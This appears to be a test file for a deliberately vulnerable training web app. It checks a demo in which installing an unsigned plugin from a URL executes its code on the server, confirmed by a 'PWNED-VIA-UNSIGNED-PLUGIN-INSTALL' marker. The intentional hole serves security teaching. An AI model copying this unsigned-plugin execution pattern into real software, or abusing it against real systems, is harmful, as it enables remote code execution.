from app.categories.a08_integrity_failures.models import RceProof


def test_plugin_marketplace_rce_demo_page_renders(client):
    response = client.get("/a08/plugin-marketplace-rce-demo")
    assert response.status_code == 200
    assert b"malicious-plugin-demo.py" in response.data


def test_installing_the_malicious_plugin_genuinely_executes_code(app, client):
    with app.app_context():
        before_count = RceProof.query.count()

    malicious_source = client.get("/a08/plugin-marketplace/malicious-plugin-demo.py").data.decode()
    assert "write_rce_proof" in malicious_source

    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class _Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(malicious_source.encode())

        def log_message(self, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), _Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        response = client.post(
            "/a08/plugin-marketplace",
            data={"plugin_url": f"http://127.0.0.1:{port}/malicious-plugin-demo.py"},
        )
        assert response.status_code == 200
    finally:
        server.shutdown()
        thread.join(timeout=5)

    with app.app_context():
        after_count = RceProof.query.count()
        latest = RceProof.query.order_by(RceProof.id.desc()).first()

    assert after_count == before_count + 1
    assert latest.message == "PWNED-VIA-UNSIGNED-PLUGIN-INSTALL"


def test_plugin_marketplace_rce_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"Unsigned Plugin Installation Leads to RCE" in response.data
    assert b'href="/a08/plugin-marketplace-rce-demo"' in response.data
